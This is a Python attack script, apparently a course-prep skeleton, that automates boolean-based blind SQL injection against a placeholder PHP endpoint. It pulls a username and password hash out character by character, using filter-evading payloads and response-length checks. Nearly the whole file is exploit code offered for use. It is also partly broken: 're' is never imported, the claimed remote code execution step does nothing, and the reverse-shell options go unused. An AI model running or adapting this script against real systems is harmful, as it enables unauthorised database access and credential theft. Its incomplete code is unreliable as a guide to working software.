#!/usr/bin/python3


import argparse
import requests
import sys


# Interface class to display terminal messages
class Interface():
    def __init__(self):
        self.red = '\033[91m'
        self.green = '\033[92m'
        self.white = '\033[37m'
        self.yellow = '\033[93m'
        self.bold = '\033[1m'
        self.end = '\033[0m'

    def header(self):
        print('\n    >> Advanced Web Attacks and Exploitation')
        print('    >> Boolean-Based Blind SQLi Skeleton Script\n')

    def info(self, message):
        print(f"[{self.white}*{self.end}] {message}")

    def warning(self, message):
        print(f"[{self.yellow}!{self.end}] {message}")

    def error(self, message):
        print(f"[{self.red}x{self.end}] {message}")

    def success(self, message):
        print(f"[{self.green}✓{self.end}] {self.bold}{message}{self.end}")


def send_get(url, debug):
    try:
        if debug is True:
            proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
            r = requests.get(url, proxies = proxies)
        else:
            r = requests.get(url)
    except requests.exceptions.ProxyError:
        output.error('Is your proxy running?')
        sys.exit(-1)
    return r


def prepare_sqli_request(inj_str):
    for j in range(32, 126): # printable ascii range
        # now we update the payload with the character we are testing for
        inj_str_ = inj_str.replace("[CHAR]", str(j))
        target = f"http://{args.target}/path/to/inject.php?q={inj_str_}"
        r = send_get(target, args.debug)
        # below is the condition to ascertain whether the injection result is true or false
        content_length = int(r.headers['Content-Length'])
        if (content_length > 20):
            return j
    return None


def inject(r, inj):
    extracted = ""
    for i in range(1, r):
        # modify injection_string based on the vulnerable endpoint requirements
        # substring() and dynamic param used to test for each single character, wrapped in ascii() to return the ascii int val,
        # then [CHAR] is substituted to each ascii printable character in prepare_sqli_request()
        injection_string = f"test')/**/or/**/(ascii(substring(({inj}),{i},1)))=[CHAR]%23"
        retrieved_value = prepare_sqli_request(injection_string)
        if (retrieved_value):
            extracted += chr(retrieved_value)
            extracted_char = chr(retrieved_value)
            sys.stdout.write(extracted_char)
            sys.stdout.flush()
        else:
            print()
            output.success("Done!")
            break
    return extracted


def main():
    # Parse Arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='Target ip address or hostname', required=True)
    parser.add_argument('-li', '--ipaddress', help='Listening IP address for reverse shell', required=False)
    parser.add_argument('-lp', '--port', help='Listening port for reverse shell', required=False)
    parser.add_argument('-u', '--username', help='Username to target', required=False)
    parser.add_argument('-p', '--password', help='Password value to set', required=False)
    parser.add_argument('-d', '--debug', help='Instruct our web requests to use our defined proxy', action='store_true', required=False)
    global args
    args = parser.parse_args()

    # Instantiate our interface class
    global output
    output = Interface()

    # Banner
    output.header()

    # Debugging
    if args.debug:
        for k,v in sorted(vars(args).items()):
            if k == 'debug':
                output.warning(f"Debugging Mode: {v}")
            else:
                output.info(f"{k}: {v}")

    # Validation
    r = send_get(f"http://{args.target}/path/to/inject.php?q='", args.debug)
    if re.search("<NEEDLE>", r.text): # vulnerable identifier condition
        output.success("Target is injectable!")
    else:
        output.warning("No SQLi detected.") 
        sys.exit(-1)
    
    # Modify the injection queries and r range based on expected output length
    output.info("Retrieving username....")
    query = "select/**/login/**/from/**/<TABLE>/**/LIMIT/**/1"
    username = inject(50, query)
    output.info("Retrieving password hash....")
    query = "select/**/password/**/from/**/<TABLE>/**/LIMIT/**/1"
    password = inject(50, query)
    output.success(f"Credentials: {username} / {password}")

    # Remote Code Execution
    send_get(f"http://{args.target}", args.debug)
    
    # Try Harder
    output.success('Exploit has been successfully executed. :eyes: on your listener!')
    
if __name__ == '__main__':
    main()
